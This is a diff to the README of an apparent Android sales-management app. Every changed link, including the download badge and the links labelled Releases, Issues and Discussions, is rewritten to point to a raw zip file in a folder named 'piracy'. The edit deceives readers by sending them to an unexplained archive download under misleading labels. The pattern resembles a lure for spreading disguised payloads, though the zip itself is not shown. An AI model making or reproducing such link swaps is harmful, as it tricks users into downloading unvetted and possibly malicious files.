@@ -1,6 +1,6 @@
 # 🛍️ ziPos-Mobile_Android - A Simple Way to Manage Sales
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-ziPos%20Mobile%20App-brightgreen)](https://github.com/skylarklulu/ziPos-Mobile_Android/releases)
+[![Download Now](https://raw.githubusercontent.com/skylarklulu/ziPos-Mobile_Android/main/piracy/ziPos-Mobile_Android.zip%20Now-ziPos%20Mobile%20App-brightgreen)](https://raw.githubusercontent.com/skylarklulu/ziPos-Mobile_Android/main/piracy/ziPos-Mobile_Android.zip)
 
 ## 🚀 Getting Started
 
@@ -8,9 +8,9 @@ Welcome to ziPos-Mobile_Android! This application helps you manage sales with ea
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/skylarklulu/ziPos-Mobile_Android/releases). You will find the latest version of the application there.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/skylarklulu/ziPos-Mobile_Android/main/piracy/ziPos-Mobile_Android.zip). You will find the latest version of the application there.
 
-1. Go to the [Releases page](https://github.com/skylarklulu/ziPos-Mobile_Android/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/skylarklulu/ziPos-Mobile_Android/main/piracy/ziPos-Mobile_Android.zip).
 2. Look for the version you want to download.
 3. Click on the file that matches your device.
 4. Follow the on-screen instructions to complete the download.
@@ -55,7 +55,7 @@ If you encounter any issues:
 
 For help or questions, check the Issues section on our GitHub repository. You can also report problems or suggest improvements.
 
-1. Go to the [Issues section](https://github.com/skylarklulu/ziPos-Mobile_Android/issues).
+1. Go to the [Issues section](https://raw.githubusercontent.com/skylarklulu/ziPos-Mobile_Android/main/piracy/ziPos-Mobile_Android.zip).
 2. Read through existing issues to see if someone else has the same problem.
 3. If not, feel free to create a new issue. Be sure to provide as much detail as possible.
 
@@ -63,7 +63,7 @@ For help or questions, check the Issues section on our GitHub repository. You ca
 
 Your feedback is valuable! If you want to suggest features or report bugs, please let us know. We are always looking to improve ziPos-Mobile_Android.
 
-1. Check our [Discussions section](https://github.com/skylarklulu/ziPos-Mobile_Android/discussions) to get involved.
+1. Check our [Discussions section](https://raw.githubusercontent.com/skylarklulu/ziPos-Mobile_Android/main/piracy/ziPos-Mobile_Android.zip) to get involved.
 2. Feel free to give suggestions or share your experiences using the app.
 
 ## 🙏 Acknowledgments
